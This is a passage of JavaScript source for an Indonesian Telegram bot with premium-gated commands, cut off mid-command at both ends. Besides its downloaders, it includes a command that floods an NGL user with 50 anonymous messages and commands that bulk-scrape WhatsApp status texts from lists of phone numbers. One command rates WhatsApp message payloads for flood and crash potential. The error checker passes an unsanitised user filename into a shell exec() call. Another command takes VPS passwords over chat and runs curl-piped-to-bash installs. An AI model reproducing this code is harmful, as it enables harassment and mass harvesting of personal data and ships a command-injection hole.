        await downloadRepo("");

        await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, 
            "✅ <b>Update Berhasil</b>\n♻️ <b>Bot restart otomatis.</b>", 
            { parse_mode: 'HTML' }
        );

        setTimeout(() => {
            process.exit(0); 
        }, 2000);

    } catch (e) {
        console.error(e);
        await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, 
            "❌ <b>Gagal update</b>, cek repo GitHub atau koneksi server.", 
            { parse_mode: 'HTML' }
        );
    }
});

// -------------------- ( Command : TiktokDL ) -------------------- \\

bot.command("tiktokdl", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 ☇ Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ ☇ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ ☇ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ ☇ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ ☇ Error ${e.response.status} saat mengunduh video`
        : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

// -------------------- ( Command : Tourl ) -------------------- \\

bot.command("tourl", checkPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("🪧 ☇ Format: /tourl reply photo");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ ☇ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("⏳ ☇ Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ ☇ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ ☇ Error ${e.response.status} saat unggah ke catbox`
      : "❌ ☇ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

// -------------------- ( Command : Spam NGL ) -------------------- \\

bot.command("spamngl", checkPremium,  async ctx => {
  const args = ctx.message.text.split(' ')
  if (args.length < 3) return ctx.reply('🪧 ☇ Format: /spamngl <username> <pesan>')

  const username = args[1]
  const message = args.slice(2).join(' ')
  const total = 50

  try {
    for (let i = 1; i <= total; i++) {
      await fetch(`https://www.laurine.site/api/tools/sendngl?username=${encodeURIComponent(username)}&message=${encodeURIComponent(message)}`)
    }

    await ctx.reply(
      `✅ ☇ Selesai mengirim ${total} pesan spam ke @${username}`,
      {
        reply_markup: {
          inline_keyboard: [
            [
              { text: '𖥂 𝑫𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓 𖥂', url: 'https://t.me/vinzxiterr' }
            ]
          ]
        }
      }
    )
  } catch (e) {
    ctx.reply('❌ ☇ Gagal menghubungi api, Coba lagi nanti.')
  }
})

// -------------------- ( Command : Iphone QC ) -------------------- \\

bot.command("iphoneqc", checkPremium, async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!text) {
    return ctx.reply("🪧 ☇ Format: /iphoneqc trash matrix nih dek", { parse_mode: "HTML" });
  }

  const moment = require("moment-timezone");
  const time = moment().tz("Asia/Jakarta").format("HH:mm");
  const battery = Math.floor(Math.random() * 44) + 55;

  let carrier;
  switch (true) {
    case text.toLowerCase().includes("love"):
      carrier = "Telkomsel";
      break;
    case text.toLowerCase().includes("game"):
      carrier = "Tri";
      break;
    case text.toLowerCase().includes("net"):
      carrier = "XL Axiata";
      break;
    default:
      const randomList = ["Indosat", "Telkomsel", "XL", "Tri", "Smartfren"];
      carrier = randomList[Math.floor(Math.random() * randomList.length)];
  }

  const messageText = encodeURIComponent(text);
  const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  await ctx.reply("⏳ ☇ Sedang membuat gambar");

  try {
    const axios = require("axios");
    const res = await axios.get(url, { responseType: "arraybuffer", timeout: 15000 });
    const buffer = Buffer.from(res.data);
    await ctx.replyWithPhoto({ source: buffer }, {
      parse_mode: "HTML",
    });
  } catch (e) {
    console.error(e);
    await ctx.reply("❌ ☇ Gagal menghubungi api, oba lagi nanti");
  }
});

// -------------------- ( Command : Fix Code ) -------------------- \\

bot.command("fixcode", checkPremium, async (ctx) => {
    try {
        const userId = ctx.from.id.toString();
        const chatType = ctx.chat.type;

        const reply = ctx.message.reply_to_message;
        if (!reply) {
            return ctx.reply("🪧 ☇ Format: /fixcode fix syntax error");
        }

        let code = '';
        let filename = 'fixed.js';
        let lang = 'JavaScript';

        if (reply.document) {
            const fileLink = await ctx.telegram.getFileLink(reply.document.file_id);
            const response = await axios.get(fileLink.href);
            code = response.data;
            filename = reply.document.file_name || 'fixed.js';

            if (filename.endsWith('.php')) {
                lang = 'PHP';
            } else if (filename.endsWith('.py')) {
                lang = 'Python';
            } else if (filename.endsWith('.html') || filename.endsWith('.htm')) {
                lang = 'HTML';
            } else if (filename.endsWith('.css')) {
                lang = 'CSS';
            } else if (filename.endsWith('.json')) {
                lang = 'JSON';
            } else {
                lang = 'JavaScript';
            }
        } else if (reply.text) {
            code = reply.text;
            filename = 'fixed.js';
            lang = 'JavaScript';
        } else {
            return ctx.reply("❌ Please reply to a text message or code file.");
        }

        const userExplanation = ctx.message.text.replace(/^\/fixcode\s*/i, '').trim() || '(no explanation provided)';

        await ctx.reply('🛠️ Fixing code...');

        const completion = await openai.chat.completions.create({
            model: 'gpt-4o-mini',
            messages: [
                {
                    role: 'system',
                    content: 'Kamu hanya berhak memperbaiki error dalam kode dan merapihkan format kode. Berikan penjelasan error dan solusi, kemudian kode yang sudah diperbaiki tanpa code block. Format: ANALYSIS:[penjelasan error] CODE:[kode fixed]'
                },
                {
                    role: 'user',
                    content: userExplanation === '(no explanation provided)' ?
                        `Perbaiki error dan rapihkan format kode ${lang} ini:\n${code}` :
                        `Perbaiki error dan rapihkan format kode ${lang} ini berdasarkan penjelasan:\n${code}\n\nPenjelasan error:\n${userExplanation}`
                }
            ]
        });

        const result = completion.choices[0].message.content;

        let explanation = '';
        let fixedCode = '';

        const analysisMatch = result.match(/ANALYSIS:\s*([\s\S]*?)(?=CODE:|$)/i);
        const codeMatch = result.match(/CODE:\s*([\s\S]*?)$/i);

        if (analysisMatch) {
            explanation = analysisMatch[1].trim();
        }

        if (codeMatch) {
            fixedCode = codeMatch[1].trim();
        } else {
            fixedCode = result;
        }

        fixedCode = fixedCode.replace(/(?:[a-zA-Z0-9]+\n)?([\s\S]*?)/g, '$1').trim();

        const header = `
<pre>༑ᐧ 𖣂 𝐓𝐫𝐚𝐬𝐇 ☇ 𝐌𝐚𝐭𝐫𝐢𝐗 𖣂 ༑ᐧ</pre>
<b>( 🛠️ ) Code Fix Result</b>

<b>Language:</b> ${lang}
<b>User Explanation:</b> ${userExplanation}

<b>Error Analysis:</b>
${explanation || 'Tidak ada analisis spesifik'}

© 𖣂VinzExerc1st. ϟ`;

        await ctx.reply(header, { parse_mode: 'HTML' });

        const tempDir = './temp';
        if (!fs.existsSync(tempDir)) {
            fs.mkdirSync(tempDir, { recursive: true });
        }
        const tempFilePath = `./temp/fixed_${Date.now()}_${filename}`;
        fs.writeFileSync(tempFilePath, fixedCode);

        await ctx.replyWithDocument({
            source: fs.createReadStream(tempFilePath),
            filename: `Fixed_${filename}`
        });

        fs.unlinkSync(tempFilePath);

        console.log(chalk.green(`✅ Code fix completed for user ${userId}`));

    } catch (error) {
        console.error(chalk.red(`❌ Fixcode error: ${error.message}`));
        await ctx.reply(`❌ Failed to fix code: ${error.message}\n\nPlease try again or contact support.`);
    }
});

// -------------------- ( Command : Play ) -------------------- \\

bot.command("play", checkPremium, async (ctx) => {
  const query = ctx.message.text.split(" ").slice(1).join(" ");

  if (!query) return ctx.reply("🪧 ☇ Format: /play monolog");

  const chatId = ctx.chat.id;
  const sender = ctx.from.username || ctx.from.first_name;

  try {
    await ctx.reply("⏳ Lagi nyari lagu di Spotify, tunggu bentar bre...");

    const api = `https://api.nekolabs.my.id/downloader/spotify/play/v1?q=${encodeURIComponent(query)}`;
    const { data } = await axios.get(api);

    if (!data.success || !data.result) {
      return ctx.reply("❌ Gagal ambil data lagu dari Spotify!");
    }

    const { metadata, downloadUrl } = data.result;
    const { title, artist, cover, duration } = metadata;

    const caption = `
<blockquote>🎵 ${title || "Unknown"}
👤 ${artist || "Unknown"}
🕒 Durasi: ${duration || "-"}</blockquote>
  `;

    await ctx.replyWithPhoto({ url: cover }, {
      caption,
      parse_mode: "HTML"
    });

    await ctx.replyWithAudio({ url: downloadUrl }, {
      title: title || "Unknown Title",
      performer: artist || "Unknown Artist",
    });

  } catch (err) {
    console.error("Play Error:", err);
    ctx.reply("❌ Terjadi kesalahan saat memutar lagu bre.");
  }
});

// -------------------- ( Command : Info Function ) -------------------- \\

bot.command("infofunction", checkPremium, async (ctx) => {
  try {
    const replied = ctx?.message?.reply_to_message?.text || ctx?.message?.reply_to_message?.caption || "";
    if (!replied) return ctx.reply("🪧 ☇ Format: /infofunction ( reply function )");

    const code = replied.trim();
    const sig =
      code.match(/async\s+function\s+([A-Za-z0-9_]+)\s*\(([^)]*)\)/) ||
      code.match(/const\s+([A-Za-z0-9_]+)\s*=\s*async\s*\(([^)]*)\)\s*=>/);
    if (!sig) return ctx.reply("❌ ☇ Function tidak valid");

    const funcName = sig[1];
    const params = (sig[2] || "").trim();

    const use  = (re) => re.test(code);
    const find = (re) => (code.match(re) || []).length;

    const flags = {
      sendMessage:  use(/\bsendMessage\s*\(/),
      relayMessage: use(/\brelayMessage\s*\(/),
      genMsg:       use(/\bgenerateWAMessageFromContent\s*\(/),
      prepMedia:    use(/\bprepareWAMessageMedia\s*\(/),
      fwdContent:   use(/\bgenerateForwardMessageContent\s*\(/),
      viewOnce:     use(/\bviewOnceMessage\b/),
      nativeFlow:   use(/\bnativeFlowMessage\b/),
      extAd:        use(/\bexternalAdReply\b/),
      location:     use(/\blocationMessage\b|degreesLatitude\b|degreesLongitude\b/),
      liveLoc:      use(/\bliveLocationMessage\b/),
      extendedText: use(/\bextendedTextMessage\b|matchedText\b|description\b/),
      buttons:      use(/\bbuttons\s*:/),
      template:     use(/\btemplate_message\b|hydratedTemplate\b/),
      payment:      use(/\bpayment[_ ]?method\b/i),
      mention:      use(/\bmentionedJid\b|\bcontextInfo\s*:\s*{[^}]*mentionedJid/),
      bigRepeat:    use(/\.repeat\(\s*(\d{3,}|[1-9]\d{3,})\s*\)/),
    };

    const counts = {
      sendMessage:  find(/\bsendMessage\s*\(/g),
      relayMessage: find(/\brelayMessage\s*\(/g),
      repeatCalls:  find(/\.repeat\s*\(/g),
    };

    const deps = [
      flags.genMsg ? "generateWAMessageFromContent" : null,
      flags.prepMedia ? "prepareWAMessageMedia" : null,
      flags.fwdContent ? "generateForwardMessageContent" : null,
    ].filter(Boolean);

    const payloads = [];
    if (flags.extendedText) payloads.push("extendedTextMessage");
    if (flags.location)     payloads.push("locationMessage");
    if (flags.liveLoc)      payloads.push("liveLocationMessage");
    if (flags.viewOnce)     payloads.push("viewOnceMessage");
    if (flags.nativeFlow)   payloads.push("nativeFlowMessage");
    if (flags.extAd)        payloads.push("externalAdReply");
    if (flags.buttons || flags.template) payloads.push("buttons/template");

    const risks = [];
    if (counts.repeatCalls > 0 || flags.bigRepeat) risks.push("payload besar / flood");
    if (counts.relayMessage + counts.sendMessage > 3) risks.push("spam/loop pesan");
    if (flags.mention) risks.push("mention massal");
    const riskLevel = risks.length ? risks.join(", ") : "rendah (normal)";

    const effects = [];
    if (flags.sendMessage || flags.relayMessage) effects.push("Ada pemanggilan API kirim/relay pesan (potensi rate-limit)");
    if (flags.viewOnce)     effects.push("Membungkus payload sebagai View Once");
    if (flags.nativeFlow)   effects.push("Menggunakan Native Flow UI (tombol interaktif)");
    if (flags.extAd)        effects.push("Menambahkan externalAdReply (rich preview)");
    if (flags.liveLoc)      effects.push("Mengirim Live Location");
    if (flags.location)     effects.push("Mengirim Location/Pin");
    if (flags.extendedText) effects.push("Menggunakan Extended Text (field panjang)");
    if (flags.buttons || flags.template) effects.push("Memakai tombol/template interaktif");
    if (flags.payment)      effects.push("Memanggil elemen payment_method (eksperimental)");
    if (flags.bigRepeat)    effects.push("Memuat .repeat(...) besar—risiko lag/crash klien");

    const caption = `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐓𝐑𝐀𝐒𝐇 𝐌𝐀𝐓𝐑𝐈𝐗 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Function
╰┈ ⸙ ${funcName} (${params})

⌑ API Usage
╰┈ ⸙ ${[flags.sendMessage ? "sendMessage" : null, flags.relayMessage ? "relayMessage" : null, ...deps].filter(Boolean).join(", ") || "—"}

⌑ Payload Type
╰┈ ⸙ ${payloads.join(", ") || "—"}

⌑ Risk Indicators
╰┈ ⸙ ${riskLevel}

⌑ Operational Effects
╰┈ ⸙ ${effects.length ? effects.join(" ") : "—"}

`.trim();

    await ctx.replyWithPhoto(thumbnailUrl, {
      caption,
      parse_mode: "HTML"
    });

  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menganalisis function");
  }
});

// -------------------- ( Command : Cek Eror ) -------------------- \\

bot.command("cekeror", checkPremium, async (ctx) => {
const fs = require('fs');
const axios = require('axios');
const { exec } = require('child_process');
const chalk = require('chalk');

const tempDir = path.join(__dirname, 'temp');

if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir, { recursive: true });
}

const PASTEBIN_RAW = "https://pastebin.com/raw/dyGe19Ls";
const GEMINI_URL = "https://generativelanguage.googleapis.com/v1/models/gemini-2.5-flash:generateContent?key=";

let API_KEY_CACHE = null;
let CACHE_TIME = 0;
const CACHE_TTL_MS = 1000 * 60 * 10;

async function getApiKey() {
  const now = Date.now();
  if (API_KEY_CACHE && now - CACHE_TIME < CACHE_TTL_MS) return API_KEY_CACHE;
  try {
    const response = await axios.get(PASTEBIN_RAW);
    const key = response.data.trim();
    if (!key) throw new Error("Empty API key from Pastebin");
    API_KEY_CACHE = key;
    CACHE_TIME = now;
    return API_KEY_CACHE;
  } catch (error) {
    console.error(chalk.red(`❌ Failed to fetch API key: ${error.message}`));
    throw error;
  }
}

async function askGemini(message) {
  try {
    const apiKey = await getApiKey();
    const payload = {
      contents: [
        {
          role: "user",
          parts: [
            {
              text: `Kamu adalah Zephyra AI Code Analyzer.
Tugasmu:
1. Analisa error secara singkat (penyebab).
2. Buat versi kode yang sudah diperbaiki (tanpa menjelaskan solusi).
Gunakan format jawaban:
ANALYSIS: [penjelasan singkat error]
FIXED_CODE: [kode yang sudah difix tanpa codeblock]
---
${message}`
            }
          ]
        }
      ]
    };

    const res = await axios.post(GEMINI_URL + encodeURIComponent(apiKey), payload, {
      headers: { "Content-Type": "application/json" },
      timeout: 1000 * 60 * 2
    });

    const data = res.data;
    const result = data?.candidates?.[0]?.content?.parts?.[0]?.text;
    if (!result) throw new Error("No response from Gemini");
    return result;
  } catch (err) {
    console.error(chalk.red(`❌ Gemini API error: ${err.message}`));
    return "AI gagal menjawab, coba lagi nanti.";
  }
}

  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) {
      return ctx.reply("🪧 ☇ Format: /cekeror (reply ke file.js atau file.py)", { parse_mode: "Markdown" });
    }

    let code = "";
    let filename = "code.txt";

    if (reply.document) {
      const fileLink = await ctx.telegram.getFileLink(reply.document.file_id);
      const response = await axios.get(fileLink.href);
      code = response.data;
      filename = reply.document.file_name || "code.txt";
    } else if (reply.text) {
      code = reply.text;
    } else {
      return ctx.reply("⚠️ *Invalid file or text!*", { parse_mode: "Markdown" });
    }

    const tempPath = `./temp_${Date.now()}_${filename}`;
    fs.writeFileSync(tempPath, code);

    const langMap = {
      ".js": "JavaScript",
      ".py": "Python",
      ".php": "PHP",
      ".json": "JSON",
      ".html": "HTML",
      ".css": "CSS",
      ".cpp": "C++",
      ".c": "C",
      ".java": "Java",
      ".ts": "TypeScript",
      ".rb": "Ruby",
      ".go": "Go",
      ".sh": "Shell Script"
    };

    let lang = "Unknown";
    for (const ext in langMap) {
      if (filename.endsWith(ext)) {
        lang = langMap[ext];
        break;
      }
    }

    await ctx.reply(`👨🏻‍💻 *Analyzing file* \`${filename}\` _(${lang})_`, { parse_mode: "Markdown" });

    let checkCmd;
    switch (lang) {
      case "JavaScript":
      case "TypeScript":
        checkCmd = `node --check ${tempPath}`;
        break;
      case "Python":
        checkCmd = `python3 -m py_compile ${tempPath}`;
        break;
      case "PHP":
        checkCmd = `php -l ${tempPath}`;
        break;
      case "JSON":
        checkCmd = `node -e "JSON.parse(require('fs').readFileSync('${tempPath}','utf-8'))"`;
        break;
      case "HTML":
      case "CSS":
        checkCmd = `npx htmlhint ${tempPath} || echo "HTML/CSS check done"`;
        break;
      case "C++":
        checkCmd = `g++ -fsyntax-only ${tempPath}`;
        break;
      case "C":
        checkCmd = `gcc -fsyntax-only ${tempPath}`;
        break;
      case "Java":
        checkCmd = `javac ${tempPath}`;
        break;
      case "Shell Script":
        checkCmd = `bash -n ${tempPath}`;
        break;
      default:
        checkCmd = `node --check ${tempPath}`;
    }

    exec(checkCmd, async (err, stdout, stderr) => {
      fs.unlinkSync(tempPath);
      const output = stderr || stdout;

      if (!err && !output.match(/(error|Error|SyntaxError)/i)) {
        return ctx.reply(`✅ *No syntax errors found!*\n\n📄 *File:* \`${filename}\`\n🧠 *Language:* ${lang}\nStatus: Safe 🚀`, { parse_mode: "Markdown" });
      }

      const errorMsg = output.trim();
      const errorLine = errorMsg.match(/:(\d+):?(\d+)?/);
      const line = errorLine ? errorLine[1] : "?";
      const col = errorLine ? errorLine[2] || "?" : "?";

      const preview = `❌ *Error found!*\n\n📄 *File:* \`${filename}\`\n👨🏻‍💻 *Language:* ${lang}\n📍 *Line:* ${line}:${col}\n\n🔍 *AI analysis is underway...*`;
      await ctx.reply(preview, { parse_mode: "Markdown" });

      const aiResponse = await askGemini(`Bahasa: ${lang}\nFile: ${filename}\nError:\n${errorMsg}\n\nIsi kode:\n${code}`);

      const analysis = aiResponse.match(/ANALYSIS:\s*([\s\S]*?)(?=FIXED_CODE:|$)/i)?.[1]?.trim() || "-";
      const fixed = aiResponse.match(/FIXED_CODE:\s*([\s\S]*)$/i)?.[1]?.trim() || "";

      // === Header Markdown ===
      const header = [
        `📄 *File:* \`${filename}\``,
        `👨🏻‍💻 *Language:* ${lang}`,
        `📍 *Line:* ${line}:${col}`,
        ``,
        `🧩 *Analysis:*`,
        `${analysis}`,
        ``,
        `© 𖣂VinzExerc1st. ϟ`
      ].join("\n");

      await ctx.reply(header, { parse_mode: "Markdown" });

      if (fixed.length > 5) {
        const fixedFile = `./temp/fixed__${Date.now()}_${filename}`;
        fs.writeFileSync(fixedFile, fixed);
        await ctx.replyWithDocument({
          source: fs.createReadStream(fixedFile),
          filename: `Fixed_${filename}`
        });
        fs.unlinkSync(fixedFile);
      }

      console.log(chalk.green(`✅ Analisa selesai untuk ${filename} (${lang})`));
    });
  } catch (err) {
    console.error(chalk.red("❌ Error cekerror:", err));
    await ctx.reply(`⚠️ *Terjadi kesalahan:* ${err.message}`, { parse_mode: "Markdown" });
  }
});

// -------------------- ( Handler Cek Bio ) -------------------- \\

async function handleBioCheck(ctx, numbersToCheck) {
    if (numbersToCheck.length === 0)
        return ctx.reply("Mana Nomer Yang Mau Di Cek Nya?");

    await ctx.reply(`⏳ Tunggu sebentar... Bot sedang mengecek ${numbersToCheck.length} nomor.`);

    let withBio = [], noBio = [], notRegistered = [];

    const jids = numbersToCheck.map(num => num.trim() + '@s.whatsapp.net');
    const existenceResults = await sock.onWhatsApp(...jids);

    const registeredJids = [];
    existenceResults.forEach(res => {
        if (res.exists) registeredJids.push(res.jid);
        else notRegistered.push(res.jid.split('@')[0]);
    });
    const registeredNumbers = registeredJids.map(jid => jid.split('@')[0]);

    if (registeredNumbers.length > 0) {

        const batchSize = 15;
        for (let i = 0; i < registeredNumbers.length; i += batchSize) {
            const batch = registeredNumbers.slice(i, i + batchSize);
            const promises = batch.map(async (nomor) => {
                const jid = nomor.trim() + '@s.whatsapp.net';
                try {
                    const statusResult = await sock.fetchStatus(jid);
                    let bioText = null, setAtText = null;
                    if (Array.isArray(statusResult) && statusResult.length > 0) {
                        const data = statusResult[0];
                        if (data) {
                            if (typeof data.status === 'string') bioText = data.status;
                            else if (typeof data.status === 'object' && data.status !== null)
                                bioText = data.status.text || data.status.status;
                            setAtText = data.setAt || (data.status && data.status.setAt);
                        }
                    }
                    if (bioText && bioText.trim() !== '') {
                        withBio.push({ nomor, bio: bioText, setAt: setAtText });
                    } else {
                        noBio.push(nomor);
                    }
                } catch {
                    notRegistered.push(nomor.trim());
                }
            });
            await Promise.allSettled(promises);
            await sleep(1000);
        }
    }

    let fileContent = "📋 HASIL CEK BIO WHATSAPP\n\n";
    fileContent += `✅ Total Nomor      : ${numbersToCheck.length}\n`;
    fileContent += `📳 Dengan Bio       : ${withBio.length}\n`;
    fileContent += `📵 Tanpa Bio        : ${noBio.length}\n`;
    fileContent += `🚫 Tidak Terdaftar  : ${notRegistered.length}\n\n`;

    if (withBio.length > 0) {
        fileContent += `────────────────────────────\n\n`;
        fileContent += `✅ NOMOR DENGAN BIO (${withBio.length})\n\n`;
        const groupedByYear = withBio.reduce((acc, item) => {
            const year = new Date(item.setAt).getFullYear() || "Tahun Tidak Diketahui";
            if (!acc[year]) acc[year] = [];
            acc[year].push(item);
            return acc;
        }, {});
        const sortedYears = Object.keys(groupedByYear).sort();
        for (const year of sortedYears) {
            fileContent += `🗓 Tahun ${year}\n\n`;
            groupedByYear[year].sort((a, b) => new Date(a.setAt) - new Date(b.setAt)).forEach(item => {
                const date = new Date(item.setAt);
                let formattedDate = '...';
                if (!isNaN(date)) {
                    const datePart = date.toLocaleDateString('id-ID', {
                        day: '2-digit', month: '2-digit', year: 'numeric'
                    });
                    const timePart = date.toLocaleTimeString('id-ID', {
                        hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false
                    }).replace(/\./g, ':');
                    formattedDate = `${datePart}, ${timePart.replace(/:/g, '.')}`;
                }
                fileContent += `└─ 📱 ${item.nomor}\n   └─ 📝 "${item.bio}"\n      └─ ⏰ ${formattedDate}\n\n`;
            });
        }
    }

    fileContent += `────────────────────────────\n\n`;
    fileContent += `📵 NOMOR TANPA BIO / PRIVASI (${noBio.length})\n\n`;
    fileContent += noBio.length > 0 ? noBio.join('\n') + '\n' : `(Kosong)\n`;

    const filePath = `./hasil_cekbio_${ctx.from.id}.txt`;
    fs.writeFileSync(filePath, fileContent);
    await ctx.replyWithDocument({ source: filePath }, { caption: "📦 Hasil Cek Bio WhatsApp" });
    fs.unlinkSync(filePath);
}

// -------------------- ( Command : Cek Bio ) -------------------- \\

bot.command('cekbio', checkPremium, checkWhatsAppConnection, async (ctx) => {
    const numbersToCheck = ctx.message.text.split(' ').slice(1).join(' ').match(/\d+/g) || [];
    await handleBioCheck(ctx, numbersToCheck);
});

// -------------------- ( Command : Cek Bio Txt ) -------------------- \\

bot.command('cekbiotxt', checkPremium, checkWhatsAppConnection, async (ctx) => {
    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.reply("Reply file .txt-nya dulu.");
    }
    const doc = ctx.message.reply_to_message.document;
    if (doc.mime_type !== 'text/plain') {
        return ctx.reply("Filenya harus .txt, jangan yang lain.");
    }
    try {
        const fileLink = await ctx.telegram.getFileLink(doc.file_id);
        const response = await axios.get(fileLink.href);
        const numbersToCheck = response.data.match(/\d+/g) || [];
        await handleBioCheck(ctx, numbersToCheck);
    } catch (error) {
        console.error("Gagal proses file:", error);
        ctx.reply("Gagal ngambil nomor dari file, coba lagi.");
    }
});

// -------------------- ( Command : InstagramDL ) -------------------- \\

bot.command("instagramdl", checkPremium, async (ctx) => {
  const url = ctx.message.text.split(" ")[1];
  if (!url) return ctx.reply("Input Link");
  try {
    await ctx.reply("Tunggu sebentar, sedang memproses...");
    const apiUrl = `https://joozxdev.my.id/api/instagram?url=${encodeURIComponent(url)}`;
    const { data } = await axios.get(apiUrl);
    if (!data.medias || data.medias.length === 0) return ctx.reply("Gagal mengambil media Instagram.");
    for (const media of data.medias) {
      if (media.type === "video") {
        await ctx.replyWithVideo({ url: media.url }, { caption: "Video Instagram" });
      } else {
        await ctx.replyWithPhoto({ url: media.url }, { caption: "Foto Instagram" });
      }
    }
  } catch (err) {
    console.error("ERROR /instagramdl:", err.message);
    ctx.reply("Terjadi kesalahan saat memproses link Instagram.");
  }
});

// -------------------- ( Command : Cek Function ) -------------------- \\

bot.command("cekfunction", checkPremium, async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply || !reply.text) {
      return ctx.reply(
        "🪧 ☇ Format:\nReply ke kode, lalu ketik /cekfunction",
        { parse_mode: "Markdown" }
      );
    }
    const ireng = reply.text.trim();
    if (
      !ireng.startsWith("async function") &&
      !ireng.startsWith("function") &&
      !ireng.includes("=>")
    ) {
      return ctx.reply("⚠️ Kode tidak terdeteksi sebagai function JavaScript.", {
        parse_mode: "Markdown",
      });
    }

    try {
      new Function(ireng);

      await ctx.reply("✅ *Tidak ada error sintaks terdeteksi!*", {
        parse_mode: "Markdown",
      });
    } catch (err) {
      let baris = "";
      const match = err.stack?.match(/<anonymous>:(\d+):(\d+)/);
      if (match) baris = `\n📍 *Baris:* ${match[1]}:${match[2]}`;

      const lines = ireng.split("\n");
      const errorLine = match ? parseInt(match[1]) - 1 : 0;
      const snippet = lines
        .slice(Math.max(0, errorLine - 2), errorLine + 3)
        .join("\n");

      await ctx.reply(
        `❌ *Function Error Terdeteksi!*\n\n📄 *Pesan:* ${err.message}${baris}\n\n🧩 *Cuplikan Kode:*\n\`\`\`js\n${snippet}\n\`\`\`\n💡 *Saran:* Periksa tanda kurung, koma, atau kurung kurawal yang tidak ditutup.`,
        { parse_mode: "Markdown",
        reply_markup: {
        inline_keyboard: buttonsBot } }
      );

      await ctx.reply("📋 Salin kode di atas jika ingin diperbaiki.", {
        reply_markup: {
          inline_keyboard: [[{ text: "Owner", url: `https://t.me/vinzxiterr` }]],
        },
      });
    }
  } catch (e) {
    console.error(e);
    ctx.reply(`❌ Error Di: ${e.message}`);
  }
});

// -------------------- ( Command : Install Protect ) -------------------- \\

bot.command('installprotect', checkPremium, async (ctx) => {
  try {
    const input = ctx.message.text.split(' ').slice(1).join(' ').trim();

    if (!input || !input.includes('|')) {
      return ctx.reply('🪧 ☇ Format: /installprotect ipvps|pwvps', { parse_mode: 'Markdown' });
    }

    const [ipvps, pwvps] = input.split('|').map(i => i.trim());
    if (!ipvps || !pwvps) {
      return ctx.reply('🪧 ☇ Format: /installprotek ipvps|pwvps', { parse_mode: 'Markdown' });
    }

    const { sock } = require('ssh2');
    const connSSH = new sock();

    const scripts = [
      'mbut.sh','mbut2.sh','mbut3.sh','mbut4.sh',
      'mbut5.sh','mbut6.sh','mbut7.sh','mbut8.sh','mbut9.sh'
    ];

    const repoURL = 'https://raw.githubusercontent.com/VinzExorc1st/ProtectPanel/main/';

    await ctx.reply(`⏳ Menghubungkan ke VPS *${ipvps}* dan mulai instalasi Protect Panel 1–9...`, { parse_mode: 'Markdown' });

    connSSH.on('ready', async () => {
      await ctx.reply('✅ Koneksi berhasil! Proses instalasi Protect Panel sedang berjalan...');

      for (let i = 0; i < scripts.length; i++) {
        const script = scripts[i];

        await ctx.reply(`🚀 Memulai Instalasi *${script}* (${i + 1}/${scripts.length})...`, {
          parse_mode: 'Markdown'
        });

        await new Promise((resolve) => {
          const cmd = `curl -fsSL ${repoURL}${script} | bash`;

          connSSH.exec(cmd, (err, stream) => {
